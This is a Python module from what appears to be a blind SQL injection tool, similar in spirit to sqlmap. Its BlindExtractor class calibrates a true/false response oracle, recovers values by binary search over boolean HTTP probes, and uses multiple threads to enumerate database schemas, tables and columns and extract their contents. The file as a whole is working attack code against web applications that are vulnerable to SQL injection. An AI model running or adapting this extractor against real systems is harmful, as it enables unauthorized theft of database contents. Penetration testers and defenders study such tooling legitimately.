from __future__ import annotations

import time
from concurrent.futures import Future, ThreadPoolExecutor, as_completed
from dataclasses import dataclass

from .client import HttpClient
from .dialects import SqlDialect
from .models import ExtractionJob, ProbeResult
from .oracle import ResponseOracle


class CalibrationError(RuntimeError):
    pass


class ExtractionError(RuntimeError):
    pass


@dataclass(slots=True)
class ExtractorConfig:
    workers: int = 4
    max_length: int = 128
    max_items: int = 128
    min_char_code: int = 32
    max_char_code: int = 126

    def __post_init__(self) -> None:
        if not 1 <= self.workers <= 16:
            raise ValueError("workers must be between 1 and 16")
        if self.max_length < 1:
            raise ValueError("max_length must be at least 1")
        if self.max_items < 1:
            raise ValueError("max_items must be at least 1")
        if not 0 <= self.min_char_code <= self.max_char_code <= 0x10FFFF:
            raise ValueError("invalid character code range")


class BlindExtractor:
    def __init__(
        self,
        client: HttpClient,
        oracle: ResponseOracle,
        dialect: SqlDialect,
        config: ExtractorConfig,
    ) -> None:
        self.client = client
        self.oracle = oracle
        self.dialect = dialect
        self.config = config
        self._started = time.monotonic()

    def probe_condition(self, condition: str) -> ProbeResult:
        payload = self.dialect.boolean_payload(condition)
        started = time.monotonic()
        response = self.client.get(payload)
        elapsed = time.monotonic() - started
        return ProbeResult(
            matched=self.oracle.evaluate(response),
            status_code=response.status_code,
            body_length=len(response.content),
            elapsed_seconds=elapsed,
            final_url=response.url,
        )

    def calibrate(self) -> tuple[ProbeResult, ProbeResult]:
        true_result = self.probe_condition("1=1")
        false_result = self.probe_condition("1=0")
        if not true_result.matched or false_result.matched:
            raise CalibrationError(
                "Oracle calibration failed. Expected TRUE to match and FALSE not to match. "
                f"TRUE(status={true_result.status_code}, bytes={true_result.body_length}, "
                f"matched={true_result.matched}); "
                f"FALSE(status={false_result.status_code}, bytes={false_result.body_length}, "
                f"matched={false_result.matched})."
            )
        return true_result, false_result

    def infer_integer(self, expression: str, maximum: int) -> int:
        if maximum < 0:
            raise ValueError("maximum cannot be negative")
        if self.probe_condition(f"COALESCE(({expression}), 0) > {maximum}").matched:
            raise ExtractionError(
                f"Inferred integer exceeds configured maximum ({maximum})."
            )
        low, high = 0, maximum
        while low < high:
            midpoint = (low + high) // 2
            if self.probe_condition(
                f"COALESCE(({expression}), 0) > {midpoint}"
            ).matched:
                low = midpoint + 1
            else:
                high = midpoint
        return low

    def extract_string(self, expression: str) -> str:
        length = self.infer_integer(
            self.dialect.length_expression(expression), self.config.max_length
        )
        characters: list[str] = []
        for position in range(1, length + 1):
            code_expression = self.dialect.char_code_expression(expression, position)
            low = self.config.min_char_code
            high = self.config.max_char_code
            if self.probe_condition(f"({code_expression}) < {low}").matched:
                raise ExtractionError(
                    f"Character at position {position} is below --min-char-code ({low})."
                )
            if self.probe_condition(f"({code_expression}) > {high}").matched:
                raise ExtractionError(
                    f"Character at position {position} exceeds --max-char-code ({high})."
                )
            while low < high:
                midpoint = (low + high) // 2
                if self.probe_condition(
                    f"({code_expression}) > {midpoint}"
                ).matched:
                    low = midpoint + 1
                else:
                    high = midpoint
            if not self.probe_condition(f"({code_expression}) = {low}").matched:
                raise ExtractionError(
                    f"Unable to confirm character at position {position}."
                )
            characters.append(chr(low))
        return "".join(characters)

    def extract_many(self, jobs: list[ExtractionJob]) -> dict[str, str]:
        if not jobs:
            return {}
        workers = min(self.config.workers, len(jobs))
        ordered_keys = [job.key for job in jobs]
        values: dict[str, str] = {}
        with ThreadPoolExecutor(
            max_workers=workers, thread_name_prefix="blind-sqli"
        ) as executor:
            futures: dict[Future[str], ExtractionJob] = {
                executor.submit(self.extract_string, job.expression): job for job in jobs
            }
            try:
                for future in as_completed(futures):
                    job = futures[future]
                    values[job.key] = future.result()
            except Exception:
                for future in futures:
                    future.cancel()
                raise
        return {key: values[key] for key in ordered_keys}

    def enumerate_schemas(self) -> list[str]:
        count = self.infer_integer(
            self.dialect.schema_count_expression(), self.config.max_items
        )
        jobs = [
            ExtractionJob(str(index), self.dialect.schema_name_expression(index))
            for index in range(count)
        ]
        return list(self.extract_many(jobs).values())

    def enumerate_tables(self, schema: str) -> list[str]:
        count = self.infer_integer(
            self.dialect.table_count_expression(schema), self.config.max_items
        )
        jobs = [
            ExtractionJob(
                str(index), self.dialect.table_name_expression(schema, index)
            )
            for index in range(count)
        ]
        return list(self.extract_many(jobs).values())

    def enumerate_columns(self, schema: str, table: str) -> list[str]:
        count = self.infer_integer(
            self.dialect.column_count_expression(schema, table), self.config.max_items
        )
        jobs = [
            ExtractionJob(
                str(index),
                self.dialect.column_name_expression(schema, table, index),
            )
            for index in range(count)
        ]
        return list(self.extract_many(jobs).values())

    @property
    def elapsed_seconds(self) -> float:
        return time.monotonic() - self._started
